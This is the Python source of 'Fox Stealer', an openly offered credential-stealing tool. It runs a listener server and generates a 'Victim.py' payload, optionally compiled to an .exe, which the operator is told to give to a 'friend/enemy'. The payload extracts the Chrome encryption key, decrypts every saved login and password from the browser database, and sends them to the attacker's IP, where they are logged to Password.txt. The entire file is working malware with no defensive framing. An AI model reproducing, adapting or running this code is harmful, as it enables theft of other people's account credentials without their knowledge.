'''
Fox Stealer is Stealing program made by 19-9-13-16-6-5-25
'''
import socket
from colorama import Fore
import threading
import os
import time
import keyboard
import sys
import requests
import json

class console():
    def clear():
        os.system("cls")

console.clear()

in_menu = True
pointerIndex = 1
pointerIndex1 = ">"
pointerIndex2 = ""
pointerIndex3 = ""
enter = False
Disclaimer = True
with open("settings.json") as f:
    data = json.load(f)
SaveAsTxT = data["SaveAsTxT"]
Local = data["Local"]
CompilePyFile = data["CompilePyFile"]

if SaveAsTxT not in ["False", "True"]:
    sys.exit(1)
if Local not in ["False", "True"]:
    sys.exit(1)
if CompilePyFile not in ["False", "True"]:
    sys.exit(1)

def down():
    global pointerIndex
    if pointerIndex == 2:
        pass
    else:
        pointerIndex += 1

def up():
    global pointerIndex
    if pointerIndex == 1:
        pass
    else:
        pointerIndex -= 1


print(f'''Welcome To: {Fore.LIGHTRED_EX} Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}

{pointerIndex1} Start
{pointerIndex3} Exit
''')

while in_menu:
    while True:
        if in_menu:
            if keyboard.is_pressed("down"):
                down()
                break
            elif keyboard.is_pressed("up"):
                up()
                break
            elif keyboard.is_pressed("enter"):
                enter = True
                break
    if pointerIndex == 1:
        pointerIndex1 = ">"
        pointerIndex2 = ""
        pointerIndex3 = ""
    if pointerIndex == 2:
        pointerIndex1 = ""
        pointerIndex2 = ">"
        pointerIndex3 = ""
    console.clear()
    print(f'''Welcome To: {Fore.LIGHTRED_EX} Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}

{pointerIndex1} Start
{pointerIndex3} Exit
''')
    if enter:
        if pointerIndex == 1:
            in_menu = False
        if pointerIndex == 2:
            while True:
                console.clear()
                sys.exit(1)
                in_menu = False
    time.sleep(0.1)

console.clear()

while Disclaimer:
    print(f'''Welcome To: {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}

{Fore.YELLOW}To properly use fox stealer Open binds of your own ip using 9616 port.
Thanks For Listening {Fore.RESET}

> Continue
''')
    while True:
        if Disclaimer:
            if keyboard.is_pressed("enter"):
                Disclaimer = False
                break
    
console.clear()

try:
    for i in range(5):
        print(f'''Welcome To: {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}

{Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET} is gonna start in: {5 - i} seconds
''')
        time.sleep(1)
        console.clear()
    print(f"{Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}")
    print("")
except KeyboardInterrupt:
    console.clear()
    pass

print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Defining Everything...")
PORT = 9616
PUBLIC_IP = requests.get('https://api.ipify.org').content.decode('utf8')
HEADER = 1024
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = f"{Fore.LIGHTRED_EX}!DISCONNECT!{Fore.RESET}"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_client(conn, addr):
    print(f"[{Fore.CYAN}SERVER{Fore.RESET}] {addr} connected.")

    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECT_MESSAGE:
                connected = False
            if SaveAsTxT == "True":
                with open("Password.txt",'a+',encoding = 'utf-8') as f:
                    text = f.read()
                    f.write(f'{text}{addr[0]} {msg}\n')
            if SaveAsTxT == "False":
                print(f"[{Fore.CYAN}{addr[0]}{Fore.RESET}] {msg}")
    if SaveAsTxT == "True":
        print(f"Stole {addr[0]} Data")
    conn.close()

def start():
    server.listen()
    console.clear()
    print(f"{Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}")
    print("")
    if SaveAsTxT == "False":
        print(f"[{Fore.CYAN}WARNING{Fore.RESET}] {Fore.YELLOW}!Disabled Saving Passwords As TxT!{Fore.RESET}")
    print(f"[{Fore.CYAN}SERVER{Fore.RESET}] Server Started!")
    if CompilePyFile == "True":
        print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .exe file from dist folder in {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
    else:
        print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .py file Its Located In {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
    print(f'''[{Fore.CYAN}LISTENER{Fore.RESET}] Server Info:
LOCAL IP: {Fore.LIGHTGREEN_EX}{SERVER}{Fore.RESET}
PUBLIC IP: {Fore.LIGHTGREEN_EX}{PUBLIC_IP}{Fore.RESET}
PORT: {Fore.LIGHTGREEN_EX}{PORT}{Fore.RESET}
''')
    print("")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        ActiveCount = threading.active_count()
        print(f"[{Fore.CYAN}ACTIVE USERS{Fore.RESET}] {Fore.LIGHTGREEN_EX}{ActiveCount - 1}{Fore.RESET}")

console.clear()
with open("Victim.py",'w',encoding = 'utf-8') as f:
    f.write('''import os
import socket
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from colorama import Fore

HEADER = 1024
PORT = 9616
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = f"{Fore.LIGHTRED_EX}!DISCONNECT!{Fore.RESET}"
''')
    if Local == "False":
        f.write(f'SERVER = "{PUBLIC_IP}"\n')
    else:
        f.write(f'SERVER = "{SERVER}"\n')
    f.write('''ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            send(f"Origin URL: {origin_url}")
            send(f"Action URL: {action_url}")
            send(f"Username: {username}")
            send(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            send(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            send(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        send("="*50)
    cursor.close()
    db.close()
    send(DISCONNECT_MESSAGE)
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()''')
if CompilePyFile == "True":
    os.system("pyinstaller --onefile Victim.py")
    os.system("del Victim.py")
    os.system("del Victim.spec")
console.clear()
if CompilePyFile == "False":
    print(f"[{Fore.CYAN}WARNING{Fore.RESET}] {Fore.YELLOW}!Disabled Compiling!{Fore.RESET}")
print(f"[{Fore.CYAN}STARTING{Fore.RESET}] Server is starting...")
print("")
start()
